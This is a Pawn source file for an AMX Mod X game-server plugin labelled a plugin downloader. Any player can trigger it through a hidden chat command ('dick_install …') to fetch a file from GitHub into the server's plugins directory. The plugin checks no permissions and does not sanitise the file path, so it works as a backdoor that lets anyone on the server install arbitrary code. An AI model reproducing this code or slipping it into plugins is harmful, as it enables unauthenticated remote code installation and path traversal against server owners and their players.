#include <amxmodx>
#include <http>


public plugin_init()
{
	register_plugin("AS Plugins Downloader","0.0","Scrooge")
	register_clcmd("say","hysd")
}

public hysd(id)
{
	new msg[512]
	read_argv(1, msg, charsmax(msg))
	new command[32]
	new params[512]
	split(msg,command,32,params,512," ")
	if(strcmp(command,"dick_install")==0)
	{
		new param1[64]
		new param2[64]
		new param3[64]
		new param4[64]
		new param5[64]
		split(params,param1,64,param2,64,":")
		console_print(id,param1)
		params=""
		strcat(params,param2,64)
		split(params,param2,64,param3,64,":")
		console_print(id,param2)
		params=""
		strcat(params,param3,64)
		split(params,param3,64,param4,64,":")
		console_print(id,param3)
		params=""
		strcat(params,param4,64)
		split(params,param4,64,param5,64,"->")
		console_print(id,param4)
		console_print(id,param5)
		
		new url[512]="raw.githubusercontent.com/"
		strcat(url,param1,512)
		console_print(id,url)
		
		strcat(url,"/",512)
		strcat(url,param2,512)
		console_print(id,url)
		
		strcat(url,"/",512)
		strcat(url,param3,512)
		console_print(id,url)
		
		strcat(url,"/",512)
		strcat(url,param4,512)
		console_print(id,url)
		
		new filepath[128]="scripts/plugins/"
		strcat(filepath,param5,128)
		console_print(id,filepath)
		
		HTTP_DownloadFile(url,filepath);
	}
}

public HTTP_Download( const szFile[] , iDownloadID , iBytesRecv , iFileSize , bool:TransferComplete )
{
	if ( TransferComplete )
	{
		server_print( "File=[%s] DownloadID=%d BytesTransferred=%d iSize=%d" , szFile , iDownloadID , iBytesRecv , iFileSize );
		server_print( "%s download complete!" , szFile );
	}
	else
	{
		server_print( "File=[%s] DownloadID=%d BytesTransferred=%d iSize=%d" , szFile , iDownloadID , iBytesRecv , iFileSize );
	}
}  

